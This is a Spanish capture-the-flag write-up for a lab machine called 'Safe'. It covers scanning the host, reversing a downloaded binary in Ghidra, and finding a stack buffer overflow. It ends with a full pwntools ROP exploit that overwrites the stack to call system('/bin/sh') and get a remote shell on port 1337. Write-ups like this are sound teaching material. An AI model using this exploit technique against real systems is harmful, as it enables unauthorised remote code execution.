# Safe

### Tags
#### Buffer Overflow
#### Binary Exploitation

Empezamos lanzando nmap para ver que puertos y servicios que se estan ejecutando.

![0](https://user-images.githubusercontent.com/50462944/174450002-4592b4e0-1b47-487e-95d7-a76c4e0b6a05.png)

Vemos que el puerto 80 y 1337 estan abiertos.

Analizando la pagina se puede ver un comentario sobre el puerto 1337. 

![1](https://user-images.githubusercontent.com/50462944/174449826-9b702237-a914-4677-a066-f11224e3fc01.png)

Si accedemos a http://10.10.10.147/myapp, se descargara "myapp" que segun el comentario se esta ejecutando en ese puerto.


![2](https://user-images.githubusercontent.com/50462944/174450232-36dc8c6e-b2ec-4803-a879-e7eba0ce6010.png)

![3](https://user-images.githubusercontent.com/50462944/174449828-213d2e92-922f-4dc3-9496-b79cbcf842b1.png)

Viendo el servicio en 1337 y "myapp" podemos ver que es lo mismo.


![4](https://user-images.githubusercontent.com/50462944/174449829-80d951b4-d691-4329-aafb-27fced7f3a8a.png)

Analizando los strings legibles podemos ver que hay un /usr/bin/uptime y la pregunta que devuelve el programa.

Estos abrimos ghidra, y creamos un proyecto y importamos el archivo.

![s2](https://user-images.githubusercontent.com/50462944/174450325-c122d315-fef5-44ae-93b2-c38559494751.png)


![s4](https://user-images.githubusercontent.com/50462944/174449825-a44d5547-bd7e-4994-b4f7-92f6fb86f071.png)

Podemos ver una la función main, una variable local_78 con 112 bits, y una funcion a nivel de sistema.

Por lo que lo interesante seria poder cambiar el /usr/bin/uptime a un /bin/sh.

![6](https://user-images.githubusercontent.com/50462944/174449832-02c396f8-3dc8-479c-aa35-de1caedd6d0c.png)


Hacemos un breackpoint en la funcion main

![ksnip_20220618-152833](https://user-images.githubusercontent.com/50462944/174452172-8407bccd-b1b0-4658-a922-8db72cea2040.png)

Avanzamos en las pilas con "si" hasta system

![ksnip_20220618-152923](https://user-images.githubusercontent.com/50462944/174452229-eb448863-5294-43a9-83c5-ef4a58d762aa.png)

Se puede ver que el valor /usr/bin/uptime que es ejecutado a nivel de sistema esta siendo guardado en la pila $rdi

![ksnip_20220618-153100](https://user-images.githubusercontent.com/50462944/174452266-ccb916ef-40de-4cda-9f84-b3fb9c87edb4.png)

```bash
~ python3 -c 'print("A"*120 + "B"*8 + "C"* 8)'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBCCCCCCCC
```

Ahora podemos ver que $rsp puede ser cambiado 

![ksnip_20220618-152509](https://user-images.githubusercontent.com/50462944/174452383-5afba89a-3979-4e1f-8651-d7d6b7627d19.png)

Analizando la funcion test podemos ver "MOV     RDI, RSP" que significa que esta moviento los valores el $rsp al $rdi. Recordando que $rdi es lo que se ejecuta en system y $rsp es lo que podemos modificar.

![5](https://user-images.githubusercontent.com/50462944/174449816-a39c1be0-5b8c-43a6-9737-71165b201520.png)

Analizamos los 

```bash
~ cat poc.py
from pwn import *

context(terminal=['tmux', 'new-window'])
context(os='linux', arch='amd64')

p = remote("10.10.10.147", 1337)

junk = b"A"*112
# Una vez pasadas las 112 "A" va a haber un desbordamiento
# Le restamos 8 por que /bin/sh\x00 serian 8 caracteres
bin_sh = b"/bin/sh\x00"
# Y remplazamos en binario el $rsi 

pop_r13 = p64(0x401206)
null = p64(0x0)

system_plt = p64(0x401040)

test = p64(0x401152)

payload = junk + bin_sh + pop_r13 + system_plt + null + null + test

p.sendline(payload)
p.interactive()
```

Una vez lanzado el ataque obtenemos una bash.

![7](https://user-images.githubusercontent.com/50462944/174449830-73918c79-32f7-4b06-8eaa-1eb3f07c1f76.png)
